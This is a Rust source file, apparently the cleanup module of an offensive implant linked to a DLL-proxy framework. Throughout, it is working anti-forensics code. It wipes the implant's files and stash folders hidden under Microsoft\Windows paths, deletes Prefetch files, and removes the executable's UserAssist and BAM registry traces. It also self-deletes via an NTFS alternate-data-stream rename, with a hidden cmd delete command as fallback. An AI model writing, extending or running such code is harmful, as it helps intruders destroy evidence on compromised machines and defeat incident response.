use std::env;
use std::ffi::OsStr;
use std::fs;
use std::os::windows::ffi::OsStrExt;
use std::path::{Path, PathBuf};
use std::process::Command;

use winreg::enums::*;
use winreg::RegKey;

#[allow(non_snake_case)]
mod win {
    use std::ffi::c_void;
    pub type HANDLE = *mut c_void;
    pub type BOOL = i32;
    pub type DWORD = u32;
    pub const DELETE: DWORD = 0x00010000;
    pub const SYNCHRONIZE: DWORD = 0x00100000;
    pub const FILE_SHARE_READ: DWORD = 0x1;
    pub const FILE_SHARE_WRITE: DWORD = 0x2;
    pub const FILE_SHARE_DELETE: DWORD = 0x4;
    pub const OPEN_EXISTING: DWORD = 3;
    pub const INVALID_HANDLE_VALUE: HANDLE = -1isize as HANDLE;
    pub const FILE_RENAME_INFO: i32 = 3;
    pub const FILE_DISPOSITION_INFO_EX: i32 = 21;
    pub const FILE_DISPOSITION_FLAG_DELETE: DWORD = 0x1;
    pub const FILE_DISPOSITION_FLAG_POSIX_SEMANTICS: DWORD = 0x2;

    #[repr(C)]
    pub struct FILE_DISPOSITION_INFO_EX_S {
        pub flags: DWORD,
    }

    extern "system" {
        pub fn CreateFileW(
            name: *const u16, access: DWORD, share: DWORD, sa: *mut c_void,
            disp: DWORD, flags: DWORD, template: HANDLE,
        ) -> HANDLE;
        pub fn CloseHandle(h: HANDLE) -> BOOL;
        pub fn SetFileInformationByHandle(
            h: HANDLE, class: i32, info: *const c_void, size: DWORD,
        ) -> BOOL;
    }
}

pub fn run() {
    eprintln!("[*] Cleanup: removing traces...");

    let exe_path = env::current_exe().unwrap_or_default();
    let exe_name = exe_path.file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("agent.exe")
        .to_uppercase();

    delete_own_files();
    clean_prefetch(&exe_name);
    clean_userassist(&exe_path);
    clean_bam(&exe_path);
    clean_shimcache();
    self_delete(&exe_path);
    std::process::exit(0);
}

// ── 1. Delete our files ──────────────────────────────────────

fn delete_own_files() {
    let temp = env::temp_dir();

    // Client ID
    let id_file = temp.join(".dllproxy_id");
    if try_secure_delete(&id_file) {
        eprintln!("[+] Deleted client ID file");
    }

    // Scanner temp artifacts (.~scan* files we might have left)
    if let Ok(entries) = fs::read_dir(&temp) {
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            if name.starts_with(".~scan") || name.starts_with(".dllproxy") {
                try_secure_delete(&entry.path());
            }
        }
    }

    // Proxy framework temp extractions (legacy path)
    let proxy_fw_dir = temp.join("proxy_fw");
    if proxy_fw_dir.exists() {
        let _ = fs::remove_dir_all(&proxy_fw_dir);
    }

    // Stash paths under LOCALAPPDATA\Microsoft\Windows\...
    // The proxy extracts to randomized paths there; clean known patterns
    if let Ok(appdata) = std::env::var("LOCALAPPDATA") {
        let base = Path::new(&appdata).join("Microsoft\\Windows");
        for subdir in ["FileCoAuth", "Explorer", "INetCache\\IE", "FontCache"].iter() {
            let dir = base.join(subdir);
            if let Ok(entries) = fs::read_dir(&dir) {
                for entry in entries.flatten() {
                    if entry.path().is_dir() {
                        if let Ok(files) = fs::read_dir(entry.path()) {
                            for f in files.flatten() {
                                let name = f.file_name().to_string_lossy().to_lowercase();
                                if name.ends_with(".tmp") {
                                    let _ = fs::remove_file(f.path());
                                }
                            }
                        }
                        let _ = fs::remove_dir(entry.path());
                    }
                }
            }
        }
    }
}

// ── 2. Prefetch ──────────────────────────────────────────────
// C:\Windows\Prefetch\<EXENAME>-<HASH>.pf
// Records that our binary was executed. Requires admin to delete.

fn clean_prefetch(exe_name_upper: &str) {
    let prefetch_dir = Path::new(r"C:\Windows\Prefetch");
    if !prefetch_dir.is_dir() {
        return;
    }

    let prefix = format!("{}-", exe_name_upper.replace(".EXE", ".EXE"));
    let mut cleaned = 0;
    if let Ok(entries) = fs::read_dir(prefetch_dir) {
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_uppercase();
            if name.starts_with(&prefix) && name.ends_with(".PF") {
                if try_secure_delete(&entry.path()) {
                    cleaned += 1;
                }
            }
        }
    }
    if cleaned > 0 {
        eprintln!("[+] Deleted {} prefetch entries", cleaned);
    }
}

// ── 3. UserAssist ────────────────────────────────────────────
// HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{GUID}\Count
// Keys are ROT13-encoded paths of executed programs.

fn clean_userassist(exe_path: &Path) {
    let path_str = exe_path.to_string_lossy().to_string();
    let rot13_path = rot13(&path_str);

    let base = r"Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist";
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    if let Ok(ua_key) = hkcu.open_subkey(base) {
        for guid in ua_key.enum_keys().flatten() {
            let count_path = format!(r"{}\{}\Count", base, guid);
            if let Ok(count_key) = hkcu.open_subkey_with_flags(&count_path, KEY_ALL_ACCESS) {
                if count_key.delete_value(&rot13_path).is_ok() {
                    eprintln!("[+] Cleaned UserAssist entry");
                }
            }
        }
    }
}

fn rot13(input: &str) -> String {
    input.chars().map(|c| match c {
        'a'..='m' | 'A'..='M' => (c as u8 + 13) as char,
        'n'..='z' | 'N'..='Z' => (c as u8 - 13) as char,
        _ => c,
    }).collect()
}

// ── 4. BAM (Background Activity Moderator) ───────────────────
// HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\<SID>\
// Stores paths of recently executed programs. Requires admin.

fn clean_bam(exe_path: &Path) {
    let path_device = to_device_path(exe_path);
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let bam_base = r"SYSTEM\CurrentControlSet\Services\bam\State\UserSettings";

    if let Ok(bam_key) = hklm.open_subkey(bam_base) {
        for sid in bam_key.enum_keys().flatten() {
            let sid_path = format!(r"{}\{}", bam_base, sid);
            if let Ok(sid_key) = hklm.open_subkey_with_flags(&sid_path, KEY_ALL_ACCESS) {
                // Try both regular path and device path formats
                let deleted = sid_key.delete_value(exe_path.to_string_lossy().as_ref()).is_ok()
                    || sid_key.delete_value(&path_device).is_ok();
                if deleted {
                    eprintln!("[+] Cleaned BAM entry");
                }
            }
        }
    }
}

fn to_device_path(path: &Path) -> String {
    // Convert C:\... to \Device\HarddiskVolume...\...
    // Simplified: BAM often stores as \Device\HarddiskVolumeX\path
    // We try the common format; exact volume number varies per system
    let path_str = path.to_string_lossy();
    if let Some(rest) = path_str.strip_prefix("C:\\") {
        format!(r"\Device\HarddiskVolume3\{}", rest)
    } else {
        path_str.to_string()
    }
}

// ── 5. ShimCache (AppCompatCache) ────────────────────────────
// Binary blob in registry — we flush it by nudging the service.
// Can't surgically remove entries without parsing the binary format,
// but we can try to get the cache to flush without our entry by
// being quick about our cleanup.

fn clean_shimcache() {
    // ShimCache is written on shutdown. If we clean up and the system
    // doesn't shut down cleanly after our execution, our entry may
    // not persist. Best we can do without parsing the binary blob.
}

// ── 6. Self-delete via NTFS data stream rename ──────────────
// Rename :$DATA to a random alternate stream, then mark for deletion.
// The file disappears from disk while the process is still running.
// Works on Windows 11 using FileDispositionInfoEx + POSIX semantics.

fn self_delete(exe_path: &Path) {
    unsafe {
        let wide_path: Vec<u16> = OsStr::new(exe_path)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        // Step 1: Open with DELETE access
        let h = win::CreateFileW(
            wide_path.as_ptr(),
            win::DELETE | win::SYNCHRONIZE,
            win::FILE_SHARE_READ | win::FILE_SHARE_WRITE | win::FILE_SHARE_DELETE,
            std::ptr::null_mut(),
            win::OPEN_EXISTING,
            0,
            std::ptr::null_mut(),
        );
        if h == win::INVALID_HANDLE_VALUE {
            eprintln!("[!] Self-delete: CreateFile failed (open)");
            return;
        }

        // Step 2: Rename :$DATA to a random alternate stream
        let stream_name: Vec<u16> = OsStr::new(":X")
            .encode_wide()
            .collect();

        #[repr(C)]
        struct FileRenameInfo {
            flags: u32,
            root_directory: usize,
            file_name_length: u32,
            file_name: [u16; 64],
        }
        let mut rename_info = FileRenameInfo {
            flags: 0,
            root_directory: 0,
            file_name_length: (stream_name.len() * 2) as u32,
            file_name: [0u16; 64],
        };
        rename_info.file_name[..stream_name.len()].copy_from_slice(&stream_name);

        if win::SetFileInformationByHandle(
            h,
            win::FILE_RENAME_INFO,
            &rename_info as *const _ as *const _,
            std::mem::size_of::<FileRenameInfo>() as u32,
        ) == 0 {
            eprintln!("[!] Self-delete: stream rename failed");
            win::CloseHandle(h);
            return;
        }
        win::CloseHandle(h);

        // Step 3: Reopen and mark for deletion
        let h = win::CreateFileW(
            wide_path.as_ptr(),
            win::DELETE | win::SYNCHRONIZE,
            win::FILE_SHARE_READ | win::FILE_SHARE_WRITE | win::FILE_SHARE_DELETE,
            std::ptr::null_mut(),
            win::OPEN_EXISTING,
            0,
            std::ptr::null_mut(),
        );
        if h == win::INVALID_HANDLE_VALUE {
            eprintln!("[!] Self-delete: CreateFile failed (delete)");
            return;
        }

        let disp = win::FILE_DISPOSITION_INFO_EX_S {
            flags: win::FILE_DISPOSITION_FLAG_DELETE | win::FILE_DISPOSITION_FLAG_POSIX_SEMANTICS,
        };

        if win::SetFileInformationByHandle(
            h,
            win::FILE_DISPOSITION_INFO_EX,
            &disp as *const _ as *const _,
            std::mem::size_of::<win::FILE_DISPOSITION_INFO_EX_S>() as u32,
        ) == 0 {
            eprintln!("[!] Self-delete: disposition failed, falling back to cmd");
            win::CloseHandle(h);
            // Fallback: cmd.exe delayed delete
            let script = format!(
                r#"/c choice /c y /n /d y /t 2 >nul & del /f /q "{}""#,
                exe_path.to_string_lossy()
            );
            let _ = Command::new("cmd")
                .args([&script])
                .stdin(std::process::Stdio::null())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .spawn();
            return;
        }

        win::CloseHandle(h);
        eprintln!("[+] Self-deleted from disk (NTFS stream method)");
    }
}

// ── Helpers ──────────────────────────────────────────────────

fn try_secure_delete(path: &Path) -> bool {
    if !path.exists() {
        return false;
    }
    // Overwrite with zeros before deleting (hinder recovery)
    if let Ok(meta) = fs::metadata(path) {
        let size = meta.len() as usize;
        let _ = fs::write(path, vec![0u8; size.min(64 * 1024)]);
    }
    fs::remove_file(path).is_ok()
}
